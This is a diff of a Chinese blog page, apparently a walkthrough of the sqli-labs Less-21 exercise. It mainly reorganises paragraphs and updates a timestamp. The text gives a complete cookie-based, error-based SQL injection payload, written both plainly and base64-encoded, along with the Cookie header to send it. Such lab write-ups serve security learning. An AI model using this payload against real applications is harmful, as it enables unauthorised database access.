@@ -630,11 +630,9 @@
 
 <h2 id="Page-2"><a href="#Page-2" class="headerlink" title="Page-2"></a>Page-2</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>cookie注入，base64加密，单引号圆括号闭合</p>
 <p>成功登录后，burp抓包</p>
-<p><code>YWRtaW4%3D</code>也就是<code>YWRtaW4=</code>,再base64解密，结果admin </p>
-<p>构造 </p>
-<p><code>admin&#39;) and updatexml(1,concat(0x7e,(database()),0x7e),1) and (&#39;</code> </p>
-<p>再base64加密</p>
-<p><code>YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw==</code></p>
+<p>cookie处<code>YWRtaW4%3D</code>也就是<code>YWRtaW4=</code>,再base64解密，结果admin </p>
+<p>构造 <code>admin&#39;) and updatexml(1,concat(0x7e,(database()),0x7e),1) and (&#39;</code> </p>
+<p>再base64加密<code>YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw==</code></p>
 <p>修改Cookie</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">Cookie: uname&#x3D;YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAoJw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
 
@@ -728,7 +726,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-13T13:58:27+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-05-13T14:01:09+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：May 13, 2020</p>
